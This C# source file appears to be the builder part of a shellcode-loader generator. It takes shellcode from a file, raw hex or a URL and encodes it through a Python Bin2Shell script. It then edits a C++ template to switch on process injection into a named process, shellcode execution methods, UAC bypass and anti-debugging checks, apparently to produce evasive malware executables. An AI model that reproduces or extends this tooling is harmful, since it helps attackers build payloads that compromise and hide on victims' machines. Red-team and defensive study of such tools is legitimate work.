using AlKesser;
using System;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Runtime.InteropServices.JavaScript.JSType;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using System.Windows.Forms;

namespace ElKesser
{
    public static class Compiler
    {
        /// <summary>
        /// Log all entered data. For debugging. 
        /// </summary>
        public static void ShowCollectedData(IWin32Window owner, UiData data)
        {
            // Helper: middle-ellipsize strings longer than 100 chars
            static string EllipsizeMiddle(string s, int maxLen = 100)
            {
                if (string.IsNullOrEmpty(s)) return s ?? string.Empty;
                if (s.Length <= maxLen) return s;
                int keep = maxLen - 2; // for ".."
                int front = keep / 2;
                int back = keep - front;
                return s.Substring(0, front) + ".." + s.Substring(s.Length - back);
            }

            if (data == null)
            {
                Logger.Warn("data is null.");
                return;
            }

            try
            {
                Logger.Info("UI snapshot (TextBoxes, ComboBoxes, ListBoxes) — begin");

                // TextBoxes (no labels)
                foreach (var kv in data.TextBoxes.OrderBy(k => k.Key))
                {
                    string raw = kv.Value ?? string.Empty;
                    string shown = EllipsizeMiddle(raw, 100);
                    Logger.Info($"TextBox '{kv.Key}': len={raw.Length}, value='{shown}'");
                }

                // ComboBoxes (selected text)
                foreach (var kv in data.ComboBoxes.OrderBy(k => k.Key))
                {
                    string raw = kv.Value ?? string.Empty;
                    string shown = EllipsizeMiddle(raw, 100);
                    Logger.Info($"ComboBox '{kv.Key}': value='{shown}'");
                }

                // ListBoxes (selected items)
                foreach (var kv in data.ListBoxes.OrderBy(k => k.Key))
                {
                    var items = kv.Value ?? new List<string>();
                    Logger.Info($"ListBox '{kv.Key}': selectedCount={items.Count}");
                    foreach (var item in items)
                    {
                        string shown = EllipsizeMiddle(item ?? string.Empty, 100);
                        Logger.Info($"  - '{shown}'");
                    }
                }

                Logger.Info("UI snapshot — end");
            }
            catch (Exception ex)
            {
                Logger.Error($"UI snapshot failed: {ex}");
            }
        }

       
        /// <summary>
        /// Creates a .bin file from either a URL, RAW hex-escaped string, or a file path.
        /// Returns the full path to the written/copied .bin file.
        /// </summary>

        public static string SaveRawHexToBin(string raw)
        {
            if (string.IsNullOrWhiteSpace(raw))
                throw new ArgumentException("raw hex input is required.", nameof(raw));

            // --- parse raw hex into bytes ---
            byte[] bytes;
            var matches = Regex.Matches(raw, @"\\x([0-9A-Fa-f]{2})");
            if (matches.Count > 0)
            {
                bytes = new byte[matches.Count];
                for (int i = 0; i < matches.Count; i++)
                    bytes[i] = Convert.ToByte(matches[i].Groups[1].Value, 16);
            }
            else
            {
                var hexOnly = new string(raw.Where(Uri.IsHexDigit).ToArray());
                if (hexOnly.Length == 0)
                    throw new FormatException("Input does not look like hex.");
                if (hexOnly.Length % 2 != 0)
                    throw new FormatException("Hex input has an odd number of digits.");

                bytes = new byte[hexOnly.Length / 2];
                for (int i = 0; i < bytes.Length; i++)
                    bytes[i] = Convert.ToByte(hexOnly.Substring(i * 2, 2), 16);
            }

            // --- compute SHA256 hash ---
            string hashHex;
            using (var sha = System.Security.Cryptography.SHA256.Create())
            {
                var hash = sha.ComputeHash(bytes);
                var sb = new StringBuilder(hash.Length * 2);
                foreach (var b in hash) sb.Append(b.ToString("x2"));
                hashHex = sb.ToString();
            }

            // --- prepare output dir ---
            string baseDir = AppDomain.CurrentDomain.BaseDirectory;
            string outDir = Path.Combine(baseDir, "temp", "shellcodes");
            Directory.CreateDirectory(outDir);

            string timestamp = DateTime.UtcNow.ToString("yyyyMMdd_HHmmss");
            string outName = $"{hashHex}_{timestamp}.bin";
            string outPath = Path.Combine(outDir, outName);

            // --- save ---
            File.WriteAllBytes(outPath, bytes);
            return outPath;
        }

        public static void CopyCppMainFromTemplate(string dirPath)
        {
            if (string.IsNullOrWhiteSpace(dirPath))
                throw new ArgumentException("Directory path is required.", nameof(dirPath));
            if (!Directory.Exists(dirPath))
                throw new DirectoryNotFoundException($"Directory not found: {dirPath}");

            string templatePath = Path.Combine(dirPath, "template.cpp");
            string mainPath = Path.Combine(dirPath, "main.cpp");

            if (!File.Exists(templatePath))
                throw new FileNotFoundException("Template file not found.", templatePath);

            if (File.Exists(mainPath))
            {
                string backupDir = Path.Combine(dirPath, "maincpp_backups");
                Directory.CreateDirectory(backupDir);

                string timestamp = DateTime.Now.ToString("yyyyMMdd_HHmmss");
                string backupFile = Path.Combine(backupDir, $"main_{timestamp}.cpp");

                File.Move(mainPath, backupFile);
            }

            File.Copy(templatePath, mainPath, overwrite: true);
        }

        //for debugging
        public static void ShowBigMessage(string text, string title = "Debug Output")
        {
            var dlg = new Form
            {
                Text = title,
                Width = 800,
                Height = 600,
                StartPosition = FormStartPosition.CenterScreen
            };

            var tb = new TextBox
            {
                Multiline = true,
                ReadOnly = true,
                ScrollBars = ScrollBars.Both,
                Dock = DockStyle.Fill,
                Font = new Font("Consolas", 9),
                Text = text
            };

            dlg.Controls.Add(tb);
            dlg.ShowDialog();
        }


        public static string[] GetBin2ShellArgs(UiData data)
        {
            // ---- helpers ----
            static int ParseIdxFromRaw(string? raw)
            {
                if (string.IsNullOrWhiteSpace(raw)) return 0;
                raw = raw.Trim();

                // 1) Try to extract: "{ Index = 4, Name = ... }"
                //    or any "Index = <num>" inside the string
                var idxEq = raw.IndexOf("Index", StringComparison.OrdinalIgnoreCase);
                if (idxEq >= 0)
                {
                    // find "Index ="
                    var eqPos = raw.IndexOf('=', idxEq);
                    if (eqPos > idxEq)
                    {
                        // grab digits after '='
                        int i = eqPos + 1;
                        while (i < raw.Length && char.IsWhiteSpace(raw[i])) i++;
                        int j = i;
                        while (j < raw.Length && char.IsDigit(raw[j])) j++;
                        if (j > i && int.TryParse(raw.AsSpan(i, j - i), NumberStyles.Integer, CultureInfo.InvariantCulture, out var idxFromEq))
                            return idxFromEq;
                    }
                }

                // 2) Try "2 - base64"
                //    Take the part before '-' (or whole string) and parse int
                var dash = raw.IndexOf('-');
                var head = (dash >= 0 ? raw[..dash] : raw).Trim();
                if (int.TryParse(head, NumberStyles.Integer, CultureInfo.InvariantCulture, out var idxHead))
                    return idxHead;

                // 3) Last resort: scan for first integer anywhere
                int start = -1;
                for (int k = 0; k < raw.Length; k++)
                {
                    if (char.IsDigit(raw[k])) { start = k; break; }
                }
                if (start >= 0)
                {
                    int end = start;
                    while (end < raw.Length && char.IsDigit(raw[end])) end++;
                    if (int.TryParse(raw.AsSpan(start, end - start), NumberStyles.Integer, CultureInfo.InvariantCulture, out var idxAny))
                        return idxAny;
                }

                return 0;
            }

            static string GetRaw(UiData d, string key)
            {
                // If the dict stores raw strings for each ComboBox, read it
                if (d.ComboBoxes != null && d.ComboBoxes.TryGetValue(key, out var val) && val != null)
                    return val;

                // Fallbacks, if needed later
                return string.Empty;
            }

            static string Q(string s)
                => string.IsNullOrEmpty(s) ? "\"\"" :
                   (s.IndexOfAny(new[] { ' ', '\t', '"' }) >= 0 ? $"\"{s.Replace("\"", "\\\"")}\"" : s);

            // ---- read RAW from UiData ----
            var rawEnc = GetRaw(data, "bin2hexEncoder");
            var rawComp = GetRaw(data, "bin2hexCompressor");
            var rawEnv = GetRaw(data, "bin2hexEnvelope");

            // ---- log RAW exactly (no processing) ----
            Logger.Info($"[RAW] Combo 'bin2hexEncoder'    => '{rawEnc}'");
            Logger.Info($"[RAW] Combo 'bin2hexCompressor' => '{rawComp}'");
            Logger.Info($"[RAW] Combo 'bin2hexEnvelope'   => '{rawEnv}'");

            // ---- parse indexes from RAW strings ----
            var encIdx = ParseIdxFromRaw(rawEnc);
            var compIdx = ParseIdxFromRaw(rawComp);
            var envIdx = ParseIdxFromRaw(rawEnv);

            // ---- build args ----
            var args = new List<string> { "-y", Constants.Bin2ShellAlgos };
            if (encIdx > 0) { args.Add("-e"); args.Add(encIdx.ToString(CultureInfo.InvariantCulture)); }
            if (compIdx > 0) { args.Add("-c"); args.Add(compIdx.ToString(CultureInfo.InvariantCulture)); }
            if (envIdx > 0) { args.Add("-env"); args.Add(envIdx.ToString(CultureInfo.InvariantCulture)); }

            var file = data.TextBoxes["shellcodeFile"];
            args.Add(file);

            // ---- command preview ----
            var cmdPreview = "python main.py " + string.Join(" ", args.Select(Q));
            Logger.Ok($"Bin2Shell command: {cmdPreview}");

            return args.ToArray();
        }

        public static async Task<string> Process(UiData data) {


            CopyCppMainFromTemplate(Constants.MainCppPath); //make a new main.cpp from template.cpp

            // Placing the shell code in the carrier
            // Case 1: .bin file is provided 
            // Pull + normalize from TextBoxes
            data.TextBoxes.TryGetValue("shellcodeFile", out var shellcodeFile);
            data.TextBoxes.TryGetValue("shellcodeRAW", out var shellcodeRAW);
            data.TextBoxes.TryGetValue("shellcodeURL", out var shellcodeURL);

            shellcodeFile = shellcodeFile?.Trim();
            shellcodeRAW = shellcodeRAW?.Trim();
            shellcodeURL = shellcodeURL?.Trim();

            bool hasFile = !string.IsNullOrWhiteSpace(shellcodeFile);
            bool hasRaw = !string.IsNullOrWhiteSpace(shellcodeRAW);
            bool hasUrl = !string.IsNullOrWhiteSpace(shellcodeURL);

            if (hasFile)
            {
                // Case 1: file
                string[] bin2shellargs = GetBin2ShellArgs(data);
                ShowBigMessage("Using file: " + shellcodeFile);
                string encodedCppShellcode = await Bin2shellService.RunPythonAsync(
                    Constants.Bin2ShellScript,
                    bin2shellargs,
                    null
                );
                ShowBigMessage(encodedCppShellcode); 
                CppSectionEditor.ReplaceInCppFile(Constants.MainCppFile, "/*encodedshellcode*/", encodedCppShellcode, false);
                CppSectionEditor.ReplaceInCppFile(Constants.MainCppFile, "unsigned int code_blob_len = 0;", "", false);
            }
            else if (hasRaw)
            {
                // Case 2: raw text → save to temp file first
                ShowBigMessage("Using RAW input");
                var filePathFromRaw = SaveRawHexToBin(shellcodeRAW); // returns path you can feed forward
                                                                     // If GetBin2ShellArgs reads from TextBoxes["shellcodeFile"], ensure you update it:
                data.TextBoxes["shellcodeFile"] = filePathFromRaw;

                string[] bin2shellargs = GetBin2ShellArgs(data);
                string encodedCppShellcode = await Bin2shellService.RunPythonAsync(
                    Constants.Bin2ShellScript,
                    bin2shellargs,
                    null
                );
                CppSectionEditor.ReplaceInCppFile(Constants.MainCppFile, "/*encodedshellcode*/", encodedCppShellcode, false);
                CppSectionEditor.ReplaceInCppFile(Constants.MainCppFile, "unsigned int code_blob_len = 0;", "", false);
            }
            else if (hasUrl)
            {
                // Case 3: URL
                ShowBigMessage("Using URL: " + shellcodeURL);
                CppSectionEditor.ReplaceInCppFile(Constants.MainCppFile, "//URLSHELL ", "", false);
                CppSectionEditor.ReplaceInCppFile(Constants.MainCppFile, "$shellurl$", shellcodeURL, false);
            }


            
            // Enabling the selecting methods from the form and filling the supplied parameters when required.

            // ComboBoxes (single selected value each)
            if (data.ComboBoxes.TryGetValue("genericShellcodeComboBox", out var genericShellcode)
                && !string.IsNullOrWhiteSpace(genericShellcode))
            {
                CppSectionEditor.UncommentMethodInSection(Constants.MainCppFile,	"GENERICSHELLCODE", genericShellcode);
            }

            if (data.ComboBoxes.TryGetValue("guardrailComboBox", out var guardrail)
                && !string.IsNullOrWhiteSpace(guardrail))
            {
                CppSectionEditor.UncommentMethodInSection(Constants.MainCppFile, "GUARDRAIL", guardrail);
            }

            if (data.ComboBoxes.TryGetValue("psInjComboBox", out var psInj)
                && !string.IsNullOrWhiteSpace(psInj))
            {
                CppSectionEditor.UncommentMethodInSection(Constants.MainCppFile, "PSINJECTION", psInj);
                //ADD STRING REPLACE FOR THE NECESSARY PARAMETERS $psname$ -> provided psname string. if not available throw an error
                if (string.IsNullOrEmpty(data.TextBoxes["PsInjPsNameTextBox"])) {
                    throw new ArgumentException("You should provide process name to inject!");
                }
                CppSectionEditor.ReplaceInCppFile(Constants.MainCppFile, "$psname$", data.TextBoxes["PsInjPsNameTextBox"], false);
                CppSectionEditor.ReplaceInCppFile(Constants.MainCppFile, "/*INJ ", "", false);
                CppSectionEditor.ReplaceInCppFile(Constants.MainCppFile, "INJ*/", "", false);
            }

            if (data.ComboBoxes.TryGetValue("shellcodeExecutionComboBox", out var execMethod)
                && !string.IsNullOrWhiteSpace(execMethod))
            {
                CppSectionEditor.UncommentMethodInSection(Constants.MainCppFile, "SHELLCODEEXECUTION", execMethod);

            }

            if (data.ComboBoxes.TryGetValue("UACBComboBox", out var uacBypass)
                && !string.IsNullOrWhiteSpace(uacBypass))
            {
                CppSectionEditor.UncommentMethodInSection(Constants.MainCppFile, "UACB", uacBypass);

            }

            // ListBox (multiple selections)
            if (data.ListBoxes.TryGetValue("antiDebugListBox", out var antiDebugSelections)
                && antiDebugSelections is { Count: > 0 })
            {
                foreach (var sel in antiDebugSelections)
                {
                    CppSectionEditor.UncommentMethodInSection(Constants.MainCppFile, "ANTIDEBUGGING", sel);
                }
            }

            //return the location of the resulting .exe file
            return null;

        }
    }
}
